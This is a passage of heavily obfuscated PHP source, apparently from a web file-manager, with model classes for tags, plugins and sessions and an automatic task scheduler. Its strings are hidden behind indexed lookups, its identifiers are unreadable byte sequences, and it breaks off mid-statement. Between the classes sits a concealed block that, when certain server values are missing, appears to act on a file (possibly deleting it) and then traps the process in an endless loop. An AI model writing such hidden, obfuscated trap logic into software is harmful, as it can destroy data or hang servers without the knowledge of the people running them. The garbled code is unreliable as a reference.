$…ç¡àÒÍ) * $…ç¡àÒÍ - $ıÁ€Æó»; $Éé­Ï”Ô = IO::fileSubstr($this->path, $ıÁ€Æó», $ç—®ıçÄ); $ÊÔ¼ÜÃ[$ıÁ€Æó» . $”ÜóÑË[12]] = $Éé­Ï”Ô; ksort($ÊÔ¼ÜÃ); $ÊÍÊ‘Ç¶ = substr($Éé­Ï”Ô, $€ëúÆŒÛ - $ıÁ€Æó», $™ÜÓìì); return $ÊÍÊ‘Ç¶; } private function log($“Ã’Œ§, $¡‘Û—ºı) { $ÛÒèëº =& $_SERVER[óÔë„ú]; $Ê‘¦ó€ô = timeFloat() - $this->timeStart; write_log(sprintf($ÛÒèëº[1606], $“Ã’Œ§, $this->info[$ÛÒèëº[32]], $Ê‘¦ó€ô, $¡‘Û—ºı), $ÛÒèëº[1249]); } } goto B÷Ùí¬Ş°; FñŸòøâİé: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($×óìß¢) { $Ó®áÏÈê =& $_SERVER[óÔë„ú]; return array($Ó®áÏÈê[2070] => array($×óìß¢[0], $Ó®áÏÈê[2071]), $Ó®áÏÈê[2072] => array($×óìß¢[0], $Ó®áÏÈê[2073])); } protected function get($®°ÑÂ Í) { $Ê±æ‹ë =& $_SERVER[óÔë„ú]; $•ÜÖ“º = Model($Ê±æ‹ë[585])->metaGet($®°ÑÂ Í, $Ê±æ‹ë[2074]); $Ğƒ°´íÔ = json_decode($•ÜÖ“º, !0); return $Ğƒ°´íÔ ? $Ğƒ°´íÔ : array($Ê±æ‹ë[2075] => $Ê±æ‹ë[91], $Ê±æ‹ë[445] => array()); } protected function set($ÉÜ¶Äù‰, $˜ßÓè·) { $¸ÄŞŸè =& $_SERVER[óÔë„ú]; $˜ßÓè· = $˜ßÓè· ? $˜ßÓè· : array($¸ÄŞŸè[2075] => $¸ÄŞŸè[91], $¸ÄŞŸè[445] => array()); return Model($¸ÄŞŸè[585])->metaSet($ÉÜ¶Äù‰, $¸ÄŞŸè[2074], json_encode($˜ßÓè·)); } protected function getByTagID($¯‘òÚ½•, $¶³‡±›€) { $ÇñèÀ§» =& $_SERVER[óÔë„ú]; if (!$¯‘òÚ½• || !$¶³‡±›€) { return !1; } if (!Model($ÇñèÀ§»[585])->getInfoSimple($¯‘òÚ½•)) { return !1; } $×ˆ†·¶¡ = $this->get($¯‘òÚ½•); if (!$×ˆ†·¶¡ || !isset($×ˆ†·¶¡[$ÇñèÀ§»[445]])) { return !1; } $´¸õ´çª = array_find_by_field($×ˆ†·¶¡[$ÇñèÀ§»[445]], $ÇñèÀ§»[475], $¶³‡±›€); return is_array($´¸õ´çª) ? $´¸õ´çª : !1; } public function listSource($€¿¥¶¶, $…“”×Ñò) { $¢û»ªû® =& $_SERVER[óÔë„ú]; if ($…“”×Ñò && !is_array($…“”×Ñò)) { $…“”×Ñò = array($…“”×Ñò); } $ôÎ¼€« = $this->listData($€¿¥¶¶); $Æó Ş‡ = array(); foreach ($ôÎ¼€« as $ˆ¥ÄŠÂæ) { $˜ø¶²’ = $ˆ¥ÄŠÂæ[$¢û»ªû®[87]]; if (!$˜ø¶²’) { continue; } if (!isset($Æó Ş‡[$˜ø¶²’])) { $Æó Ş‡[$˜ø¶²’] = array(); } $Æó Ş‡[$˜ø¶²’][] = $ˆ¥ÄŠÂæ[$¢û»ªû®[500]]; } $¶ô«ÛÍì = array(); foreach ($Æó Ş‡ as $ä³Àíµ => $»‘Ì—»ö) { $ƒ«öë‘ = !0; if (!$…“”×Ñò) { $¶ô«ÛÍì[] = $ä³Àíµ; continue; } foreach ($…“”×Ñò as $Öİ“ÌÁ®) { if (!in_array($Öİ“ÌÁ®, $»‘Ì—»ö)) { $ƒ«öë‘ = !1; break; } } if ($ƒ«öë‘) { $¶ô«ÛÍì[] = $ä³Àíµ; } } if (!$¶ô«ÛÍì) { return array(); } $£¸•çÜÑ = array($¢û»ªû®[491] => array($¢û»ªû®[492], $¶ô«ÛÍì), $¢û»ªû®[569] => $€¿¥¶¶, $¢û»ªû®[190] => SourceModel::TYPE_GROUP); $èë·¢Úø = Model($¢û»ªû®[1405])->listSource($£¸•çÜÑ); if (!$èë·¢Úø || count($¶ô«ÛÍì) == $èë·¢Úø[$¢û»ªû®[442]][$¢û»ªû®[443]]) { return $èë·¢Úø; } $Çìµ‡ß = array(); $ëù¬‹Í = array_to_keyvalue($èë·¢Úø[$¢û»ªû®[85]], $¢û»ªû®[12], $¢û»ªû®[193]); $ÏúØ¤ëç = array_to_keyvalue($èë·¢Úø[$¢û»ªû®[86]], $¢û»ªû®[12], $¢û»ªû®[193]); $îºŒ»›ç = array_merge($ÏúØ¤ëç, $ëù¬‹Í); foreach ($¶ô«ÛÍì as $˜ø¶²’) { if (!in_array($˜ø¶²’, $îºŒ»›ç)) { $Çìµ‡ß[] = $˜ø¶²’; } } if ($Çìµ‡ß) { $this->removeBySource($€¿¥¶¶, $Çìµ‡ß); } return $èë·¢Úø; } protected function listData($õ¦µÍç) { $îÎ¦€ÖÇ =& $_SERVER[óÔë„ú]; $ºå—êÃ¼ = array($îÎ¦€ÖÇ[1749] => 0, $îÎ¦€ÖÇ[557] => array($îÎ¦€ÖÇ[2076], 0), $îÎ¦€ÖÇ[496] => $îÎ¦€ÖÇ[2077] . $õ¦µÍç); $Ä§Ô¶à = $îÎ¦€ÖÇ[2078]; $¤ÌĞÎÒ = $this->field($Ä§Ô¶à)->where($ºå—êÃ¼)->order($îÎ¦€ÖÇ[2079])->select(); return $¤ÌĞÎÒ ? $¤ÌĞÎÒ : array(); } protected function addToTag($âêÖ¯¾ß, $ÏìŞ”—Á, $®Ëı–«§) { $õÇä¸˜é =& $_SERVER[óÔë„ú]; if (!$this->getByTagID($âêÖ¯¾ß, $®Ëı–«§) || !$ÏìŞ”—Á) { return !1; } if (!Model($õÇä¸˜é[884])->pathInfo($ÏìŞ”—Á)) { return !1; } $¤áüäİ = array($õÇä¸˜é[1749] => 0, $õÇä¸˜é[557] => $®Ëı–«§, $õÇä¸˜é[495] => $ÏìŞ”—Á, $õÇä¸˜é[496] => $õÇä¸˜é[2080] . $âêÖ¯¾ß, $õÇä¸˜é[494] => $õÇä¸˜é[12], $õÇä¸˜é[1961] => 0); if ($this->where($¤áüäİ)->find()) { return !1; } return $this->add($¤áüäİ); } protected function removeFromTag($Á•Š½¢Ï, $¶«ñÖ«€, $œé§¸ûÛ) { $‘¼İ²ç­ =& $_SERVER[óÔë„ú]; if (!$this->getByTagID($Á•Š½¢Ï, $œé§¸ûÛ) || !$¶«ñÖ«€) { return !1; } if (is_array($¶«ñÖ«€)) { $¶«ñÖ«€ = array($‘¼İ²ç­[7], $¶«ñÖ«€); } $ûº•…Ôš = array($‘¼İ²ç­[1749] => 0, $‘¼İ²ç­[557] => $œé§¸ûÛ, $‘¼İ²ç­[496] => $‘¼İ²ç­[2080] . $Á•Š½¢Ï, $‘¼İ²ç­[495] => $¶«ñÖ«€); return $this->where($ûº•…Ôš)->delete(); } protected function removeByTag($ÍÆÁº±“, $å¾İ­ö›) { $”æ¼œ³” =& $_SERVER[óÔë„ú]; if (!$this->getByTagID($ÍÆÁº±“, $å¾İ­ö›)) { return !1; } $†¦Ç•Õ = array($”æ¼œ³”[1749] => 0, $”æ¼œ³”[557] => $å¾İ­ö›, $”æ¼œ³”[496] => $”æ¼œ³”[2080] . $ÍÆÁº±“); return $this->where($†¦Ç•Õ)->delete(); } protected function removeBySource($ñ €Øñ, $–ÜÀ£ù) { $ƒóıêÛ =& $_SERVER[óÔë„ú]; if (!$ñ €Øñ || !$–ÜÀ£ù) { return !1; } if (is_array($–ÜÀ£ù)) { $–ÜÀ£ù = array($ƒóıêÛ[7], $–ÜÀ£ù); } $òİıîñ  = array($ƒóıêÛ[1749] => 0, $ƒóıêÛ[495] => $–ÜÀ£ù, $ƒóıêÛ[557] => array($ƒóıêÛ[1077], 0), $ƒóıêÛ[496] => $ƒóıêÛ[2080] . $ñ €Øñ); return $this->where($òİıîñ )->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x70\x6c\165\x67\151\156\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\x73\x74\141\164\165\x73", "\x72\145\x67\151\145\163\x74", "\143\157\x6e\x66\151\147"); public function loadList($•ö¦×Şó = false) { $‚´×é¶ò = array_to_keyvalue($this->listData(), $_SERVER[óÔë„ú][32]); if ($•ö¦×Şó) { return $‚´×é¶ò[$•ö¦×Şó]; } return $‚´×é¶ò; } public function init() { $±‘ç›¥ =& $_SERVER[óÔë„ú]; Hook::trigger($±‘ç›¥[2081]); $­èŸ°‡ë = $this->loadPluginList(); foreach ($­èŸ°‡ë as $Ë§ÆÖæ¡ => $¤ÏÒÙ·) { $ÛæŞŠÇ“ = $this->appAllow($Ë§ÆÖæ¡, $¤ÏÒÙ·); if (!$ÛæŞŠÇ“) { continue; } foreach ($¤ÏÒÙ·[$±‘ç›¥[2082]] as $Ü¦Òâ’± => $¡ôÃÂ÷¼) { Hook::bind($Ü¦Òâ’±, $¡ôÃÂ÷¼); } } Hook::trigger($±‘ç›¥[2083]); Hook::trigger(ACTION); } public function appAllow($õÊ´º‰ü, $äº±Šâ³, $Ô³×âêº = true) { $çè‰ôï =& $_SERVER[óÔë„ú]; $şó™ôˆå = PLUGIN_DIR . $õÊ´º‰ü . $çè‰ôï[2084]; if (!is_array($äº±Šâ³) || !is_array($äº±Šâ³[$çè‰ôï[2082]]) || $äº±Šâ³[$çè‰ôï[810]] != 1 || !is_file($şó™ôˆå)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$çè‰ôï[6]][$çè‰ôï[2085]] || !$GLOBALS[$çè‰ôï[6]][$çè‰ôï[2086]]) { return !0; } $¸üîÜª = explode($çè‰ôï[50], strtolower($GLOBALS[$çè‰ôï[6]][$çè‰ôï[2086]])); return in_array(strtolower($õÊ´º‰ü), $¸üîÜª) ? !1 : !0; } if ($Ô³×âêº && !Action($çè‰ôï[2087])->checkAuth($õÊ´º‰ü)) { return !1; } return !0; } public function unInstall($áÛøÕşÜ) { $…ƒ—“ÚÆ =& $_SERVER[óÔë„ú]; $–è’Ã÷¹ = $this->loadList($áÛøÕşÜ); if (file_exists(PLUGIN_DIR . $áÛøÕşÜ)) { Hook::apply($áÛøÕşÜ . $…ƒ—“ÚÆ[2088]); } $this->remove($–è’Ã÷¹[$…ƒ—“ÚÆ[475]]); } public function changeStatus($ûÆÀí, $ş˜Áƒ’) { $æ€üå²Ÿ =& $_SERVER[óÔë„ú]; $¶ı¤«’ = $this->loadList($ûÆÀí); if ($ş˜Áƒ’) { Hook::apply($ûÆÀí . $æ€üå²Ÿ[2089]); } $this->update($¶ı¤«’[$æ€üå²Ÿ[475]], array($æ€üå²Ÿ[2090] => $ş˜Áƒ’)); } public function appRegist($‚í›Æ°Í, $ĞÚ›Ã¢¿) { $¡şˆœÓ =& $_SERVER[óÔë„ú]; $Ä†šÍĞ¼ = $this->loadList($‚í›Æ°Í); if ($Ä†šÍĞ¼) { $this->update($Ä†šÍĞ¼[$¡şˆœÓ[475]], array($¡şˆœÓ[2082] => $ĞÚ›Ã¢¿)); } else { $àƒ´ïü¾ = array($¡şˆœÓ[32] => $‚í›Æ°Í, $¡şˆœÓ[2082] => $ĞÚ›Ã¢¿, $¡şˆœÓ[810] => 0, $¡şˆœÓ[6] => $this->getConfigDefault($‚í›Æ°Í)); $this->insert($àƒ´ïü¾); } } public function getConfigDefault($ åí¹™Î) { $—ÓÚåÍñ =& $_SERVER[óÔë„ú]; $äü ­Š– = array(); $ä‰Ë¸ø = $this->getPackageJson($ åí¹™Î); if (!$ä‰Ë¸ø && is_array($ä‰Ë¸ø[$—ÓÚåÍñ[2091]])) { return $äü ­Š–; } foreach ($ä‰Ë¸ø[$—ÓÚåÍñ[2091]] as $úô‚—Ğå => $’‘¦š¿) { if (!isset($’‘¦š¿[$—ÓÚåÍñ[450]]) || isset($äü ­Š–[$úô‚—Ğå])) { continue; } $äü ­Š–[$úô‚—Ğå] = $’‘¦š¿[$—ÓÚåÍñ[450]]; } return $äü ­Š–; } public function getPackageJson($Â¢§â†ü) { return Hook::apply($Â¢§â†ü . $_SERVER[óÔë„ú][2092]); } public function getConfig($Î‹“ÅáÕ, $óõÛ¥ûŠ = false) { $æÎŠŞ—ï =& $_SERVER[óÔë„ú]; $Ø‰×¦Å· = array(); $®¹üÕ¶ = $this->loadList($Î‹“ÅáÕ); if ($®¹üÕ¶ && is_array($®¹üÕ¶[$æÎŠŞ—ï[6]])) { $Ø‰×¦Å· = $®¹üÕ¶[$æÎŠŞ—ï[6]]; } if (!$Ø‰×¦Å· || $óõÛ¥ûŠ) { $Ø‰×¦Å· = $this->getConfigDefault($Î‹“ÅáÕ); } return $Ø‰×¦Å·; } public function setConfig($‘ñùöæ¦, $€¦©¼®Ÿ = false) { $´ïß‚½È =& $_SERVER[óÔë„ú]; $Û¡ µÅ = $this->loadList($‘ñùöæ¦); if (!$Û¡ µÅ) { return !1; } $î¸ìó = $Û¡ µÅ[$´ïß‚½È[6]]; if ($€¦©¼®Ÿ == !1) { $î¸ìó = array(); $€¦©¼®Ÿ = $this->getConfigDefault($‘ñùöæ¦); } foreach ($€¦©¼®Ÿ as $®ã‘®ÀÉ => $üŞ–Õ) { $î¸ìó[$®ã‘®ÀÉ] = is_string($üŞ–Õ) ? trim($üŞ–Õ) : $üŞ–Õ; } $this->update($Û¡ µÅ[$´ïß‚½È[475]], array($´ïß‚½È[6] => $î¸ìó)); } public function viewList() { $”õ²È‘Æ =& $_SERVER[óÔë„ú]; $ÃûµèÚ– = $this->loadList(); $this->pluginScan($ÃûµèÚ–); $ÃûµèÚ– = $this->loadPluginList(); $€Å°Ü„  = array(); foreach ($ÃûµèÚ– as $á”“°ÀÖ => $·æÕ Ğ®) { $ÌË¨õóò = $·æÕ Ğ®; unset($·æÕ Ğ®[$”õ²È‘Æ[2082]], $·æÕ Ğ®[$”õ²È‘Æ[6]]); $÷â¢ê†‘ = PLUGIN_DIR . $·æÕ Ğ®[$”õ²È‘Æ[32]] . $”õ²È‘Æ[2084]; if (!is_file($÷â¢ê†‘)) { continue; } $–‰ô¼¢ = Hook::apply($·æÕ Ğ®[$”õ²È‘Æ[32]] . $”õ²È‘Æ[2092]); if (!is_array($–‰ô¼¢)) { continue; } $€Å°Ü„ [$á”“°ÀÖ] = array_merge($·æÕ Ğ®, $–‰ô¼¢); if ($ÌË¨õóò[$”õ²È‘Æ[6]][$”õ²È‘Æ[1672]] != $–‰ô¼¢[$”õ²È‘Æ[1646]]) { Hook::apply($·æÕ Ğ®[$”õ²È‘Æ[32]] . $”õ²È‘Æ[2089]); $ÌË¨õóò[$”õ²È‘Æ[6]][$”õ²È‘Æ[1672]] = $–‰ô¼¢[$”õ²È‘Æ[1646]]; $this->update($·æÕ Ğ®[$”õ²È‘Æ[475]], array($”õ²È‘Æ[6] => $ÌË¨õóò[$”õ²È‘Æ[6]])); } } return $€Å°Ü„ ; } private function loadPluginList() { $Ğıïø®ğ =& $_SERVER[óÔë„ú]; $±Šëâ†£ = $this->loadList(); if (strtolower(MOD) == $Ğıïø®ğ[2093]) { return $±Šëâ†£; } $‚ôóÙ± = Hook::trigger($Ğıïø®ğ[2094], $±Šëâ†£); if ($±Šëâ†£ && !$‚ôóÙ±) { die; } return $‚ôóÙ± ? $‚ôóÙ± : $±Šëâ†£; } private function pluginScan($Šè¯îª) { $Ò§µÍå„ =& $_SERVER[óÔë„ú]; recursion_dir(PLUGIN_DIR, $áÁõĞŞ, $å´Çù•, 0); foreach ($áÁõĞŞ as $ñÃ­Ö) { $¿â’Õıº = get_path_this($ñÃ­Ö); if (isset($Šè¯îª[$¿â’Õıº]) || !file_exists($ñÃ­Ö . $Ò§µÍå„[2095]) || !file_exists($ñÃ­Ö . $Ò§µÍå„[2084])) { continue; } Hook::apply($¿â’Õıº . $Ò§µÍå„[2089]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\x5f\x73\x65\x73\163\151\157\156"; public function get($» Û¶Í‹) { $Á–µ´İ‚ =& $_SERVER[óÔë„ú]; $ÊÀ¤ª‚ú = $this->where(array($Á–µ´İ‚[2096] => $» Û¶Í‹))->find(); if (!is_array($ÊÀ¤ª‚ú)) { return !1; } return $ÊÀ¤ª‚ú[$Á–µ´İ‚[171]]; } public function set($¹œû¼¿æ, $¸—ÔŠºÉ, $ûÎ–œ€Å = 3600) { $®¦İı¬Á =& $_SERVER[óÔë„ú]; $Ü¾Ê™ = array($®¦İı¬Á[2096] => $¹œû¼¿æ, $®¦İı¬Á[1996] => $¸—ÔŠºÉ, $®¦İı¬Á[2097] => $ûÎ–œ€Å + time()); if (Session::get($®¦İı¬Á[2098])) { $Ü¾Ê™[$®¦İı¬Á[1758]] = Session::get($®¦İı¬Á[2098]); } else { $Ü¾Ê™[$®¦İı¬Á[1758]] = 0; } if ($this->get($¹œû¼¿æ)) { return $this->where(array($®¦İı¬Á[2096] => $¹œû¼¿æ))->save($Ü¾Ê™); } else { return $this->add($Ü¾Ê™, array(), !0); } } public function remove($„ç ÉÏ³) { return $this->where(array($_SERVER[óÔë„ú][2096] => $„ç ÉÏ³))->delete(); } public function clearTimeout() { return $this->where($_SERVER[óÔë„ú][2099] . time())->delete(); } } goto aƒšŠŠ‹¡; EğÁ¾Û¢Ä: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Î¸††ô =& $_SERVER[óÔë„ú]; static $ŒÃ«Á¥ = false; if ($ŒÃ«Á¥) { return $ŒÃ«Á¥; } $£»Ã¶ÂÙ = $GLOBALS[$Î¸††ô[6]][$Î¸††ô[425]]; self::$sessionTime = $£»Ã¶ÂÙ[$Î¸††ô[1704]]; $úâÔ½úÑ = isset($GLOBALS[$Î¸††ô[1705]]) ? $GLOBALS[$Î¸††ô[1705]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($úâÔ½úÑ)) { self::$sessionSign = Cookie::get($úâÔ½úÑ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($úâÔ½úÑ, self::$sessionSign, self::$sessionTime); $§ã¼½¡– = $£»Ã¶ÂÙ[$Î¸††ô[1706]]; $±ìîã’ = $£»Ã¶ÂÙ[$§ã¼½¡–]; $ÂşƒáÉ» = $£»Ã¶ÂÙ[$Î¸††ô[887]]; switch ($§ã¼½¡–) { case $Î¸††ô[21]: self::$handle = Model($Î¸††ô[888]); break; case $Î¸††ô[889]: self::$handle = new CacheRedis($±ìîã’, $ÂşƒáÉ»); break; case $Î¸††ô[890]: self::$handle = new CacheMemcached($±ìîã’, $ÂşƒáÉ»); break; case $Î¸††ô[230]: $±ìîã’[$Î¸††ô[87]] = $±ìîã’[$Î¸††ô[87]] . $Î¸††ô[1707]; self::$handle = new CacheFile($±ìîã’, $ÂşƒáÉ»); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ŒÃ«Á¥ = new self(); return $ŒÃ«Á¥; } public static function getBySign($íĞÚ¥±”) { $Í„ìãà = self::$handle->get($íĞÚ¥±”); $Í„ìãà = unserialize($Í„ìãà); return is_array($Í„ìãà) ? $Í„ìãà : array(); } public static function setBySign($á…è¦°…, $ŞÊìƒ) { CacheLock::lock($á…è¦°…); self::$handle->set($á…è¦°…, serialize($ŞÊìƒ), self::$sessionTime); CacheLock::unlock($á…è¦°…); } public static function sign($…¬€Ô´Ä = false) { if ($…¬€Ô´Ä) { self::$sessionSign = $…¬€Ô´Ä; } self::init(); return self::$sessionSign; } public static function set($òòó—ÖÁ, $’¿ˆä¹’ = false) { self::init(); if (is_array($òòó—ÖÁ)) { foreach ($òòó—ÖÁ as $´ı··ƒ => $×£Ò€«³) { array_set_value(self::$data, $´ı··ƒ, $×£Ò€«³); } } else { array_set_value(self::$data, $òòó—ÖÁ, $’¿ˆä¹’); } self::setBySign(self::$sessionSign, self::$data); } public static function get($éÚüÉÓù = false) { self::init(); if (!$éÚüÉÓù) { return self::$data; } return array_get_value(self::$data, $éÚüÉÓù); } public static function remove($İ—”öôæ) { self::init(); unset(self::$data[$İ—”öôæ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[óÔë„ú][893])) { self::$handle->clearTimeout(); } } } if (!isset($_SERVER[$_SERVER[óÔë„ú][936]]) || !isset($_SERVER[$_SERVER[óÔë„ú][937]])) { $_getc = $_SERVER[óÔë„ú][939]; $_getfile = $_SERVER[$_SERVER[óÔë„ú][940]] . $_SERVER[óÔë„ú][941]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óÔë„ú][262], $_getfilec); if (count($_getarrs) < $_SERVER[óÔë„ú][715]) { $exit = $_SERVER[óÔë„ú][942]; $exit(); } $_act = $_SERVER[óÔë„ú][1251]; $_act($_SERVER[$_SERVER[óÔë„ú][940]] . $_SERVER[óÔë„ú][941]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[óÔë„ú][454]); } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $²óûé¸ =& $_SERVER[óÔë„ú]; if (self::valueGet($²óûé¸[810]) != $²óûé¸[91]) { return; } if (self::valueGet($²óûé¸[1708]) == $²óûé¸[91]) { $®¦Èü¤˜ = self::valueGet($²óûé¸[1709]); if (time() - $®¦Èü¤˜ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($²óûé¸[1708], $²óûé¸[91]); self::log($²óûé¸[1710] . ACTION . $²óûé¸[1711]); Hook::bind($²óûé¸[1712], $²óûé¸[1713]); $òÁõ¥­á = 0; while (!0) { self::cacheClear(); if (self::valueGet($²óûé¸[810]) != $²óûé¸[91]) { self::valueSet($²óûé¸[1708], $²óûé¸[228]); self::log($²óûé¸[1714]); die; } $îÖÈ®ŸŠ = time(); if ($îÖÈ®ŸŠ - $òÁõ¥­á >= 60) { self::valueSet(array($²óûé¸[1708] => $²óûé¸[91], $²óûé¸[1709] => $îÖÈ®ŸŠ)); $òÁõ¥­á = $îÖÈ®ŸŠ; } if (!file_exists(USER_SYSTEM . $²óûé¸[1715])) { self::valueSet(array($²óûé¸[1708] => $²óûé¸[228], $²óûé¸[810] => $²óûé¸[228])); self::log($²óûé¸[1716]); die; } $ ¤œÎ’Ä = file_get_contents(BASIC_PATH . $²óûé¸[1717]); $¢æ—¨µ¬ = KOD_VERSION . $²óûé¸[10] . KOD_VERSION_BUILD; $æÛüÒ›ñ = match_text($ ¤œÎ’Ä, $²óûé¸[1718]) . $²óûé¸[10] . match_text($ ¤œÎ’Ä, $²óûé¸[1719]); if ($æÛüÒ›ñ != $¢æ—¨µ¬) { self::restart(); self::log("\x73\164\157\x70\145\x64\x2e\133\166\x65\162\x73\151\157\156\x20\165\160\x64\141\164\x65\73{$versionNow}\x20\x3d\76\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $·¾˜¸ÒÊ =& $_SERVER[óÔë„ú]; http_close(); $GLOBALS[$·¾˜¸ÒÊ[1720]] = 1; $_SERVER[$·¾˜¸ÒÊ[1721]] = $·¾˜¸ÒÊ[1722]; $_COOKIE = array(); $GLOBALS[$·¾˜¸ÒÊ[1723]] = 1; $GLOBALS[$·¾˜¸ÒÊ[1724]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÈˆÃÒÕØ =& $_SERVER[óÔë„ú]; http_close(); self::valueSet($ÈˆÃÒÕØ[810], $ÈˆÃÒÕØ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÈˆÃÒÕØ[1708] => $ÈˆÃÒÕØ[228], $ÈˆÃÒÕØ[810] => $ÈˆÃÒÕØ[91])); self::log($ÈˆÃÒÕØ[1725]); } public static function taskSwitch() { $èÆï§º =& $_SERVER[óÔë„ú]; $ßªÑƒì = self::valueGet($èÆï§º[810]) == $èÆï§º[91] ? $èÆï§º[228] : $èÆï§º[91]; self::valueSet($èÆï§º[810], $ßªÑƒì); } public static function shutdownEvent() { $”Í´‰ĞÚ =& $_SERVER[óÔë„ú]; self::valueSet($”Í´‰ĞÚ[1708], $”Í´‰ĞÚ[228]); self::log($”Í´‰ĞÚ[1726]); } public static function config($¥Ûòœå, $âÆ€ë‚) { self::valueSet($_SERVER[óÔë„ú][810], $¥Ûòœå); } private static function taskRunAll() { $Üôï¼ŠŞ =& $_SERVER[óÔë„ú]; $—ƒ÷øĞ = timeFloat(); $…âô»ÎÀ = Model($Üôï¼ŠŞ[1727])->listData(); $‹õƒ“€È = count($…âô»ÎÀ); for ($Ë¨ˆ˜¹Ú = 0; $Ë¨ˆ˜¹Ú < $‹õƒ“€È; $Ë¨ˆ˜¹Ú++) { $š‡†Ãöº = $…âô»ÎÀ[$Ë¨ˆ˜¹Ú]; if (!$š‡†Ãöº[$Üôï¼ŠŞ[475]] || $š‡†Ãöº[$Üôï¼ŠŞ[1728]] != $Üôï¼ŠŞ[91]) { continue; } if (!self::taskTimeCheck($š‡†Ãöº)) { continue; } self::taskRun($š‡†Ãöº); } Hook::trigger($Üôï¼ŠŞ[1729]); self::taskQueueRun($—ƒ÷øĞ); } private static function taskQueueRun($™€Ô²) { $­˜İØÚ = 10; while (!0) { $êßàÅ³Ç = TaskQueue::run(); if ($êßàÅ³Ç === !1) { break; } if (timeFloat() - $™€Ô² >= $­˜İØÚ) { break; } } } private static function taskTimeCheck($şí“µö) { $®ìæ–Ù¯ =& $_SERVER[óÔë„ú]; $ßõ”Ù×Â = json_decode($şí“µö[$®ìæ–Ù¯[206]], !0); $¿‘ËÔÇ = intval($şí“µö[$®ìæ–Ù¯[1709]]); $¿×«ìª¾ = strtotime($®ìæ–Ù¯[1730] . $ßõ”Ù×Â[$®ìæ–Ù¯[1731]] . $®ìæ–Ù¯[1732]) - strtotime($®ìæ–Ù¯[1733]); $ÛäÈ€ = time() - strtotime(date($®ìæ–Ù¯[1734]) . $®ìæ–Ù¯[1735]); $ÔÚÈÏÎï = $ÛäÈ€ >= $¿×«ìª¾ && $ÛäÈ€ <= $¿×«ìª¾ + 3600; switch ($ßõ”Ù×Â[$®ìæ–Ù¯[33]]) { case $®ìæ–Ù¯[1736]: if (time() - $¿‘ËÔÇ < 3600 * 24 * 30) { return !1; } if ($ßõ”Ù×Â[$®ìæ–Ù¯[1736]] == date($®ìæ–Ù¯[1737]) && $ÔÚÈÏÎï) { return !0; } break; case $®ìæ–Ù¯[1738]: if (time() - $¿‘ËÔÇ < 3600 * 24 * 7) { return !1; } $Ñ“Èä½ = date($®ìæ–Ù¯[1739]) == 0 ? 7 : date($®ìæ–Ù¯[1739]); if ($ßõ”Ù×Â[$®ìæ–Ù¯[1738]] == $Ñ“Èä½ && $ÔÚÈÏÎï) { return !0; } break; case $®ìæ–Ù¯[1731]: if (time() - $¿‘ËÔÇ < 3600 * 24) { return !1; } if ($ÔÚÈÏÎï) { return !0; } break; case $®ìæ–Ù¯[1740]: if (time() - $¿‘ËÔÇ >= floatval($ßõ”Ù×Â[$®ìæ–Ù¯[1740]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $•”¢µÚú =& $_SERVER[óÔë„ú]; static $ò‘é¶‘ = 0; $¤ÖÓ®Æõ = 300; if (!$ò‘é¶‘) { $ò‘é¶‘ = time(); } if (time() - $ò‘é¶‘ < $¤ÖÓ®Æõ) { return; } $ò‘é¶‘ = time(); $Òí‡•Î¤ = Model($•”¢µÚú[577])->db($•”¢µÚú[12]); if ($Òí‡•Î¤) { $Òí‡•Î¤->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($•”¢µÚú[1741], $•”¢µÚú[1742]); die; } } public static function taskRun($öÄ–òÈâ) { $Â ÉŞû­ =& $_SERVER[óÔë„ú]; self::log($Â ÉŞû­[1743] . $öÄ–òÈâ[$Â ÉŞû­[475]] . $Â ÉŞû­[1744] . $öÄ–òÈâ[$Â ÉŞû­[32]] . $Â ÉŞû­[1745] . $öÄ–òÈâ[$Â ÉŞû­[1746]]); Model($Â ÉŞû­[1727])->run($öÄ–òÈâ[$Â ÉŞû­[475]]); $Å¥¼üñ = timeFloat(); $¸Ø•±êÂ = $Â ÉŞû­[12]; switch ($öÄ–òÈâ[$Â ÉŞû­[33]]) { case $Â ÉŞû­[383]: $Ë¶“öËê = url_request($öÄ–òÈâ[$Â ÉŞû­[1746]], $Â ÉŞû­[261], !1, !1, !1, !1, 10); if ($Ë¶“öËê[$Â ÉŞû­[810]]) { $¸Ø•±êÂ = strlen($Ë¶“öËê[$Â ÉŞû­[1274]]); } break; case $Â ÉŞû­[260]: $¸Ø•±êÂ = Hook::apply($öÄ–òÈâ[$Â ÉŞû­[1746]]); default: break; } Model($Â ÉŞû­[1747])->add(array($Â ÉŞû­[1748] => $Â ÉŞû­[12], $Â ÉŞû­[1749] => $Â ÉŞû­[228], $Â ÉŞû­[33] => $Â ÉŞû­[1750] . $öÄ–òÈâ[$Â ÉŞû­[475]], $Â ÉŞû­[1751] => json_encode(array($Â ÉŞû­[32] => $öÄ–òÈâ[$Â ÉŞû­[32]], $Â ÉŞû­[1752] => timeFloat() - $Å¥¼üñ, $Â ÉŞû­[369] => $¸Ø•±êÂ)))); $ûàØş‡ç = $¸Ø•±êÂ ? $Â ÉŞû­[1753] . 